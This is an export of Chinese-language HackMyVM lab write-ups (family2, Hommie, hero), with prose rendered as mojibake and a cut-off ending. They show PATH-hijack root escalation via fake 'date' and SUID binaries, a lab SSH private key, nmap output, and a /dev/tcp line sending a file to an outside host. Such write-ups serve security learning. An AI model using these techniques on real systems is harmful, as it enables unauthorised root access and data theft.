<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">dad</span>@family2:/opt$ ./clock </span><br><span class="line"><span class="attribute">Thu</span> <span class="number">13</span> Feb <span class="number">2025</span> <span class="number">10</span>:<span class="number">09</span>:<span class="number">26</span> AM CET</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°å°±æ˜¯æŸ¥çœ‹æ—¶é—´<br>ç°åœ¨æˆ‘ä»¬åªè¦åŠ«æŒè¿™ä¸ªdateå°±å¥½äº†ï¼ŒæŠŠdataæ›¿æ¢æˆæˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„bashè„šæœ¬å°±å¥½äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">dad<span class="variable">@family2</span><span class="symbol">:/opt</span><span class="variable">$ </span>echo <span class="string">&quot;/bin/bash&quot;</span> &gt; date</span><br><span class="line"><span class="symbol">bash:</span> <span class="symbol">date:</span> <span class="title class_">Permission</span> denied</span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:/opt</span><span class="variable">$ </span>cd /home/dad</span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>echo <span class="string">&quot;/bin/bash&quot;</span> &gt; date</span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span><span class="variable constant_">PATH</span>=^C</span><br><span class="line">.bash_history    .bashrc          .local/          .python_history  </span><br><span class="line">.bash_logout     date             .profile         user.txt         </span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span><span class="variable constant_">PATH</span>=<span class="regexp">/home/dad</span><span class="symbol">:</span><span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>/opt/clock</span><br><span class="line"><span class="title class_">Thu</span> <span class="number">13</span> <span class="title class_">Feb</span> <span class="number">2025</span> <span class="number">10</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">39</span> <span class="variable constant_">AM</span> <span class="variable constant_">CET</span></span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x date</span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>/opt/clock</span><br><span class="line"><span class="title class_">Thu</span> <span class="number">13</span> <span class="title class_">Feb</span> <span class="number">2025</span> <span class="number">10</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:</span><span class="number">01</span> <span class="variable constant_">AM</span> <span class="variable constant_">CET</span></span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>export <span class="variable constant_">PATH</span>=<span class="regexp">/home/dad</span><span class="symbol">:</span><span class="variable">$PATH</span></span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>/opt/clock</span><br><span class="line">root<span class="variable">@family2</span><span class="symbol">:~</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>è¿™æ ·å­æŠŠç¯å¢ƒå˜é‡æ”¹æˆç”¨æˆ‘ä»¬ç›®å½•ä¸‹çš„dateï¼Œç„¶åå†…å®¹æ˜¯<code>/bin/bash</code>è¿™æ ·å°±ç›´æ¥å¾—åˆ°rootçš„shelläº†</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸ªé¶æœºè¿˜æ˜¯æŒºå¥½ç©çš„ï¼Œç»“åˆäº†å¾ˆå¤šå°çŸ¥è¯†ç‚¹ï¼Œè¿™é‡Œwebç«¯å°±ç›´æ¥ç»™äº†id_rsa,æ€»ä½“éš¾åº¦è¿˜æ˜¯æ¯”family1ç®€å•ä¸€ç‚¹ã€‚<br>å­¦åˆ°äº†ç”¨<code>enum4linux -a</code> è¿™ä¸ªæ–¹æ³•æ‰«ææ‰€æœ‰æœ‰smbçš„é¶æœºï¼Œå¾—åˆ°ç”¨æˆ·å<br>ææƒéƒ¨åˆ†æ˜¯ä¸»è¦è€ƒæŸ¥ç¯å¢ƒå˜é‡ï¼ŒåŠ æ·±æˆ‘ä»¬å¯¹ç¯å¢ƒå˜é‡çš„ç†è§£ï¼Œç”¨PATHåŠ«æŒè·å¾—shell</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Hommie</title>
    <url>/posts/61994.html</url>
    <content><![CDATA[<p>HMV-Hommieé¶åœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679a35f8d0e0a243d4f878cf.png"></p>
<h1 id="Hommie"><a href="#Hommie" class="headerlink" title="Hommie"></a>Hommie</h1><h2 id="ç«¯å£æ‰«æ-ä¿¡æ¯æ”¶é›†"><a href="#ç«¯å£æ‰«æ-ä¿¡æ¯æ”¶é›†" class="headerlink" title="ç«¯å£æ‰«æ&#x2F;ä¿¡æ¯æ”¶é›†"></a>ç«¯å£æ‰«æ&#x2F;ä¿¡æ¯æ”¶é›†</h2><p><img src="https://pic1.imgdb.cn/item/679a3ec2d0e0a243d4f87a20.png" alt="|700"><br>å‘ç°æœ‰ä¸‰ä¸ªç«¯å£  ftp ssh http<br>å…ˆçœ‹çœ‹ftpèƒ½ä¸èƒ½åŒ¿åç™»å½•<br><img src="https://pic1.imgdb.cn/item/679a3ec6d0e0a243d4f87a21.png" alt="|550"><br>å°è¯•æŠŠåå¼¹shellæ–‡ä»¶ä¸Šä¼   æ— æ³•å¾—åˆ°shell<br>80ç«¯å£<br><img src="https://pic1.imgdb.cn/item/679a3ec8d0e0a243d4f87a22.png"><br>å¾—åˆ°ä¸¤ä¸ªç”¨æˆ· alexia nobody   å¹¶ä¸”æç¤ºæˆ‘ä»¬è¦å¾—åˆ°alexiaçš„id_rsa<br>ç›®å½•æ‰«æ<br><img src="https://pic1.imgdb.cn/item/679a3eccd0e0a243d4f87a23.png"><br><img src="https://pic1.imgdb.cn/item/679a3ed0d0e0a243d4f87a24.png"><br>ä½¿ç”¨äº†ä¸¤ä¸ªå¸¸ç”¨çš„ç›®å½•å­—å…¸éƒ½æ²¡æœ‰æ‰«æåˆ° è¯´æ˜å¤§æ¦‚ç‡å°±æ˜¯æ²¡æœ‰å…¶ä»–ç›®å½•<br>webå¦‚æœæ²¡æœ‰ä¿¡æ¯å°±è¯´æ˜ä¿¡æ¯æ”¶é›†è¿˜ä¸è¿‡     â€“ é‡æ–°ç”¨nmapæ‰«æ  çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–æœåŠ¡<br> <img src="https://pic1.imgdb.cn/item/679a3ef9d0e0a243d4f87a28.png"><br> æœ‰æ–°çš„å‘ç°  è¿˜æœ‰å¼€æ”¾dhcpc tftp æœåŠ¡<br> æ ¹æ®å‰é¢çš„æç¤º  get id_rsa  æˆåŠŸå¾—åˆ°rsaç§é’¥  ç™»å½•åˆ°ssh<br> <img src="https://pic1.imgdb.cn/item/679a3f04d0e0a243d4f87a2d.png"><br> æˆåŠŸæ‹¿åˆ°shell</p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p><img src="https://pic1.imgdb.cn/item/679a3f07d0e0a243d4f87a2e.png"><br>æ²¡æœ‰sudoæŒ‡ä»¤  æŸ¥suid  ä¸ä¸€æ ·çš„å°±æ˜¯çš„ç¬¬ä¸€ä¸ª<code>/opt/showMetheKey</code><br>æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ä¹‹å å‘ç°æ˜¯ä¸€ä¸ªrsaç§é’¥<br><img src="https://pic1.imgdb.cn/item/679a3f0cd0e0a243d4f87a2f.png"><br>è¿™ä¸ªç§é’¥æ˜¯å½“å‰ç”¨æˆ·çš„  æˆ‘ä»¬è¦æƒ³åŠæ³•å¾—åˆ°rootç”¨æˆ·çš„<br>ç°åœ¨å°†è¿™ä¸ªæ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ° <code>cat showMetheKey &gt; /dev/tcp/192.168.240.83/1234</code><br><img src="https://pic1.imgdb.cn/item/679a3f0cd0e0a243d4f87a30.png"><br>ç”¨idaåˆ†æè¿™ä¸ªç¨‹åº<br><img src="https://pic1.imgdb.cn/item/679a3f80d0e0a243d4f87a3a.png"></p>
<p>æ‰€ä»¥ä¿®æ”¹ç¯å¢ƒå˜é‡ è¿™æ ·å­å°±å¯ä»¥å¾—åˆ°rootçš„rsaç§é’¥<br><img src="https://pic1.imgdb.cn/item/679a3f73d0e0a243d4f87a33.png"><br><img src="https://pic1.imgdb.cn/item/679a3f7ad0e0a243d4f87a38.png"><br>æˆåŠŸç™»å½•åˆ°root<br><img src="https://pic1.imgdb.cn/item/679a3f7fd0e0a243d4f87a39.png"></p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-hero</title>
    <url>/posts/20816.html</url>
    <content><![CDATA[<p>HMV-heroé¶æœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a62239d0e0a243d4fca307.png"></p>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.179.180</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">07</span> <span class="number">15</span>:<span class="number">58</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.180</span> (<span class="number">192.168</span>.<span class="number">179.180</span>)</span><br><span class="line">Host is up (<span class="number">0.0071</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE    SERVICE         VERSION</span><br><span class="line"><span class="number">53</span><span class="symbol">/tcp</span>   open     domain          dnsmasq <span class="number">2.51</span></span><br><span class="line">| <span class="params">dns-nsid:</span> </span><br><span class="line">|_  bind.<span class="params">version:</span> dnsmasq-<span class="number">2.51</span></span><br><span class="line"><span class="number">8081</span><span class="symbol">/tcp</span> filtered blackice-icecap</span><br><span class="line">MAC <span class="params">Address:</span> AE:<span class="number">01</span>:<span class="number">4</span>B:<span class="number">69</span>:<span class="number">88</span>:D3 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> phone</span><br><span class="line"><span class="params">Running:</span> Google Android <span class="number">10</span>.X, Linux <span class="number">4</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:google:android:<span class="number">10</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS <span class="params">details:</span> Android <span class="number">9</span> <span class="operator">-</span> <span class="number">10</span> (Linux <span class="number">4.9</span> <span class="operator">-</span> <span class="number">4.14</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">7.15</span> ms <span class="number">192.168</span>.<span class="number">179.180</span> (<span class="number">192.168</span>.<span class="number">179.180</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">20.09</span> seconds</span><br></pre></td></tr></table></figure></div>

<h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>è®¿é—®80ç«¯å£å¾—åˆ°sshç§é’¥ ç„¶åç”Ÿæˆå…¬é’¥ å¾—åˆ°ç”¨æˆ·å</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># curl 192.168.179.81</span></span><br><span class="line"><span class="params">-----BEGIN</span> OPENSSH PRIVATE KEY<span class="params">-----</span></span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span><br><span class="line">QyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwgAAAJAczctSHM3L</span><br><span class="line">UgAAAAtzc2gtZWQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwg</span><br><span class="line">AAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75</span><br><span class="line">BbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=</span><br><span class="line"><span class="params">-----END</span> OPENSSH PRIVATE KEY<span class="params">-----</span></span><br><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># ssh-keygen -y -f tmp</span></span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKiYY31x+ZMvvHfmGWC7ZE75BbdbAKYEtIX75k6CL27C shawa@hero</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥æœ‰ç¡¬æ§äº†æˆ‘å¥½ä¹…å¥½ä¹…ï¼š<br>çœ‹å¤§ä½¬ä»¬ç”¨<a href="https://github.com/n8n-io/n8n%E4%B8%AD%E7%9A%84ssh%E8%BF%9E%E6%8E%A5%EF%BC%8C%E6%88%91%E5%8D%A1%E4%BA%86%E5%BE%88%E4%B9%85%E3%80%82%E8%AE%B2%E8%AE%B2%E6%88%91%E7%9A%84%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B%EF%BC%9A">https://github.com/n8n-io/n8nä¸­çš„sshè¿æ¥ï¼Œæˆ‘å¡äº†å¾ˆä¹…ã€‚è®²è®²æˆ‘çš„å¿ƒè·¯å†ç¨‹ï¼š</a><br>å¤§å®¶ä¸€èµ·æ‰“é¶æœºï¼Œç„¶åå‘è¿™ä¸ªn8nçš„githubåœ°å€å’Œä½¿ç”¨çš„ç•Œé¢ï¼Œè€Œä¸”è¿™ä¸ªn8nè¿˜æ˜¯ä¸€ä¸ªå·¥å…·ï¼Œç”¨æ³•ä¹Ÿæ˜¯ç”¨dockeræ‰“å¼€ï¼Œä½†æ˜¯æˆ‘ä»æ¥æ²¡è§è¿‡ï¼Œè¿™ä¸ªé¶æœºä¹Ÿæ²¡æœ‰å¼€æ”¾22ç«¯å£ï¼Œæˆ‘ä»¥ä¸ºå¤§ä½¬ä»¬ç”¨è¿™ä¸ªå·¥å…·æ¥åº”å¯¹è¿™ç§æƒ…å†µã€‚è€Œä¸”æˆ‘åœ¨æœ¬æœºè¿è¡Œè¿™ä¸ªæœåŠ¡çš„ç•Œé¢ä¹Ÿæ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚<br>ä½¿ç”¨æ–¹å¼æ˜¯è¿™æ ·çš„ï¼š<br><img src="https://pic1.imgdb.cn/item/67a62298d0e0a243d4fca311.png"><br>åœ¨é¦–é¡µç‚¹å‡»credentialsç„¶åaddï¼Œç‚¹å‡»æ·»åŠ ï¼Œé€‰æ‹©sshç§é’¥çš„é€‰é¡¹ï¼Œç„¶åè¾“å…¥ipï¼Œç”¨æˆ·åï¼Œç§é’¥ã€‚<br>é—®é¢˜å°±æ¥äº†ï¼šæˆ‘å§‹ç»ˆè¿ä¸ä¸Šï¼Œçœ‹å¤§ä½¬ä»¬è¯´ç”¨172.17.0.1ï¼Œå› ä¸ºè¿™ä¸ªæœåŠ¡åœ¨dockerä¸Šè·‘çš„ï¼ˆè¿™é‡Œæ›´åŠ æ·±äº†æˆ‘çš„è¯¯è§£ï¼‰ï¼Œä½†æ˜¯æˆ‘å°±æ˜¯æ­»æ´»è¿ä¸ä¸Šï¼Œå¹¶ä¸”æˆ‘ä¸€ç›´ç›¸ä¿¡æ˜¯ä¸æ˜¯æˆ‘çš„é…ç½®å“ªé‡Œå‡ºé”™äº†ï¼Œç„¶åå°±ä¸Šç½‘ä¸€ç›´æœdockerçš„é…ç½®ï¼Œæˆ‘è¿æ¥ä¸ä¸Šçš„æ˜¾ç¤ºæ˜¯ç«¯å£æ‹’ç»è¿æ¥ï¼Œæˆ‘ä¹Ÿå»dockerå†…éƒ¨å‘ç°æ²¡æœ‰sshæœåŠ¡æ‰“å¼€ï¼Œç„¶åæ•´äº†åŠå¤©ï¼Œdockerçš„å†…å®¹ä¹Ÿæœäº†åŠå¤©ï¼Œæœ€åå®åœ¨æä¸ä¸‹å»äº†ï¼Œå°±æ˜¯è¿æ¥ä¸ä¸Šã€‚æˆ‘å°±æƒ³ç€æˆ‘è‡ªå·±èƒ½ä¸èƒ½æ‰¾åˆ°åˆ«çš„å‡ºè·¯ã€‚<br>è¿™æ—¶å€™æˆ‘å‘ç°ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -p- 192.168.179.81                             </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">07</span> <span class="number">21</span>:<span class="number">31</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">179.81</span>)</span><br><span class="line">Host is up (<span class="number">0.0017</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span>   open  http</span><br><span class="line"><span class="number">5678</span><span class="symbol">/tcp</span> open  rrac</span><br><span class="line">MAC <span class="params">Address:</span> DE:<span class="number">86</span>:<span class="number">60</span>:<span class="number">02</span>:F4:<span class="number">97</span> (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">2.13</span> seconds</span><br><span class="line"></span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.179.81 -p 5678</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">07</span> <span class="number">21</span>:<span class="number">32</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">179.81</span>)</span><br><span class="line">Host is up (<span class="number">0.0034</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">5678</span><span class="symbol">/tcp</span> open  rrac<span class="operator">?</span></span><br><span class="line">| <span class="params">fingerprint-strings:</span> </span><br><span class="line">|   <span class="params">GetRequest:</span> </span><br><span class="line">|     HTTP<span class="symbol">/1.1</span> <span class="number">200</span> OK</span><br><span class="line">|     <span class="params">Accept-Ranges:</span> bytes</span><br><span class="line">|     <span class="params">Cache-Control:</span> public, max-age<span class="operator">=</span><span class="number">86400</span></span><br><span class="line">|     <span class="params">Last-Modified:</span> Fri, <span class="number">07</span> Feb <span class="number">2025</span> <span class="number">12</span>:<span class="number">36</span>:<span class="number">13</span> GMT</span><br><span class="line">|     <span class="params">ETag:</span> W<span class="operator">/</span><span class="string">&quot;7b7-194e0691fac&quot;</span></span><br><span class="line">|     <span class="params">Content-Type:</span> text<span class="symbol">/html</span>; <span class="attr">charset</span><span class="operator">=</span>UTF-<span class="number">8</span></span><br><span class="line">|     <span class="params">Content-Length:</span> <span class="number">1975</span></span><br><span class="line">|     <span class="params">Vary:</span> Accept-Encoding</span><br><span class="line">|     <span class="params">Date:</span> Fri, <span class="number">07</span> Feb <span class="number">2025</span> <span class="number">13</span>:<span class="number">32</span>:<span class="number">19</span> GMT</span><br><span class="line">|     <span class="params">Connection:</span> close</span><br><span class="line">|     <span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE html<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>html lang<span class="operator">=</span><span class="string">&quot;en&quot;</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;head&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>script type<span class="operator">=</span><span class="string">&quot;module&quot;</span> crossorigin src<span class="operator">=</span><span class="string">&quot;/assets/polyfills-DfOJfMlf.js&quot;</span><span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>meta charset<span class="operator">=</span><span class="string">&quot;utf-8&quot;</span> <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>meta http-equiv<span class="operator">=</span><span class="string">&quot;X-UA-Compatible&quot;</span> content<span class="operator">=</span><span class="string">&quot;IE=edge&quot;</span> <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>meta name<span class="operator">=</span><span class="string">&quot;viewport&quot;</span> content<span class="operator">=</span><span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span> <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>link rel<span class="operator">=</span><span class="string">&quot;icon&quot;</span> href<span class="operator">=</span><span class="string">&quot;/favicon.ico&quot;</span> <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;style&gt;</span>@media (<span class="params">prefers-color-scheme:</span> dark) &#123; body &#123; <span class="params">background-color:</span> rgb(<span class="number">45</span>, <span class="number">46</span>, <span class="number">46</span>) &#125; &#125;<span class="operator">&lt;</span><span class="operator">/</span>style<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>script type<span class="operator">=</span><span class="string">&quot;text/javascript&quot;</span><span class="operator">&gt;</span></span><br><span class="line">|     window.BASE_PATH <span class="operator">=</span> &#x27;<span class="operator">/</span>&#x27;;</span><br><span class="line">|     window.REST_ENDPOINT <span class="operator">=</span> &#x27;rest&#x27;;</span><br><span class="line">|     <span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>script src<span class="operator">=</span><span class="string">&quot;/rest/sentry.js&quot;</span><span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;script&gt;</span><span class="operator">!</span>function(t,e)&#123;var o,n,</span><br><span class="line">|   HTTPOptions, <span class="params">RTSPRequest:</span> </span><br><span class="line">|     HTTP<span class="symbol">/1.1</span> <span class="number">404</span> Not Found</span><br><span class="line">|     <span class="params">Content-Security-Policy:</span> default-src &#x27;none&#x27;</span><br><span class="line">|     <span class="params">X-Content-Type-Options:</span> nosniff</span><br><span class="line">|     <span class="params">Content-Type:</span> text<span class="symbol">/html</span>; <span class="attr">charset</span><span class="operator">=</span>utf-<span class="number">8</span></span><br><span class="line">|     <span class="params">Content-Length:</span> <span class="number">143</span></span><br><span class="line">|     <span class="params">Vary:</span> Accept-Encoding</span><br><span class="line">|     <span class="params">Date:</span> Fri, <span class="number">07</span> Feb <span class="number">2025</span> <span class="number">13</span>:<span class="number">32</span>:<span class="number">19</span> GMT</span><br><span class="line">|     <span class="params">Connection:</span> close</span><br><span class="line">|     <span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE html<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>html lang<span class="operator">=</span><span class="string">&quot;en&quot;</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;head&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>meta charset<span class="operator">=</span><span class="string">&quot;utf-8&quot;</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;title&gt;</span>Error<span class="operator">&lt;</span><span class="operator">/</span>title<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span><span class="operator">/</span>head<span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;body&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;pre&gt;</span>Cannot OPTIONS <span class="operator">/</span><span class="operator">&lt;</span><span class="operator">/</span>pre<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span><span class="operator">/</span>body<span class="operator">&gt;</span></span><br><span class="line">|_    <span class="operator">&lt;</span><span class="operator">/</span>html<span class="operator">&gt;</span></span><br><span class="line"><span class="number">1</span> service unrecognized despite returning data. If you know the service<span class="operator">/</span>version, please submit the following fingerprint at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>cgi-bin<span class="operator">/</span>submit.cgi<span class="operator">?</span><span class="params">new-service :</span></span><br><span class="line">SF-Port5678-TCP:V<span class="operator">=</span><span class="number">7.95</span>%I<span class="operator">=</span><span class="number">7</span>%D<span class="operator">=</span><span class="number">2</span><span class="operator">/</span><span class="number">7</span>%Time<span class="operator">=</span><span class="number">67</span>A60B63%P<span class="operator">=</span>aarch64-unknown-linux-gnu</span><br><span class="line">SF:%r(GetRequest,<span class="number">8</span>DC,<span class="string">&quot;HTTP/1<span class="char escape_">\.</span>1<span class="char escape_">\x</span>20200<span class="char escape_">\x</span>20OK<span class="char escape_">\r</span><span class="char escape_">\n</span>Accept-Ranges:<span class="char escape_">\x</span>20bytes<span class="char escape_">\r</span>\</span></span><br><span class="line"><span class="string">SF:nCache-Control:<span class="char escape_">\x</span>20public,<span class="char escape_">\x</span>20max-age=86400<span class="char escape_">\r</span><span class="char escape_">\n</span>Last-Modified:<span class="char escape_">\x</span>20Fri,<span class="char escape_">\x</span></span></span><br><span class="line"><span class="string">SF:2007<span class="char escape_">\x</span>20Feb<span class="char escape_">\x</span>202025<span class="char escape_">\x</span>2012:36:13<span class="char escape_">\x</span>20GMT<span class="char escape_">\r</span><span class="char escape_">\n</span>ETag:<span class="char escape_">\x</span>20W/<span class="char escape_">\&quot;</span>7b7-194e0691fac\</span></span><br><span class="line"><span class="string">SF:&quot;</span>\r\nContent-Type:\x20text<span class="symbol">/html</span>;\x20charset<span class="operator">=</span>UTF-<span class="number">8</span>\r\nContent-Length:\x2</span><br><span class="line">SF:<span class="number">01975</span>\r\nVary:\x20Accept-Encoding\r\nDate:\x20Fri,\x2007\x20Feb\x202025</span><br><span class="line">SF:\x2013:<span class="number">32</span>:<span class="number">19</span>\x20GMT\r\nConnection:\x20close\r\n\r\n<span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE\x20html<span class="operator">&gt;</span>\n</span><br><span class="line">SF:<span class="operator">&lt;</span>html\x20lang<span class="operator">=</span>\<span class="string">&quot;en<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span>&lt;head&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;script<span class="char escape_">\x</span>20type=<span class="char escape_">\&quot;</span>module<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20cros</span></span><br><span class="line"><span class="string">SF:sorigin<span class="char escape_">\x</span>20src=<span class="char escape_">\&quot;</span>/assets/polyfills-DfOJfMlf<span class="char escape_">\.</span>js<span class="char escape_">\&quot;</span>&gt;&lt;/script&gt;<span class="char escape_">\n</span><span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;met</span></span><br><span class="line"><span class="string">SF:a<span class="char escape_">\x</span>20charset=<span class="char escape_">\&quot;</span>utf-8<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20/&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;meta<span class="char escape_">\x</span>20http-equiv=<span class="char escape_">\&quot;</span>X-UA-Compatible</span></span><br><span class="line"><span class="string">SF:<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20content=<span class="char escape_">\&quot;</span>IE=edge<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20/&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;meta<span class="char escape_">\x</span>20name=<span class="char 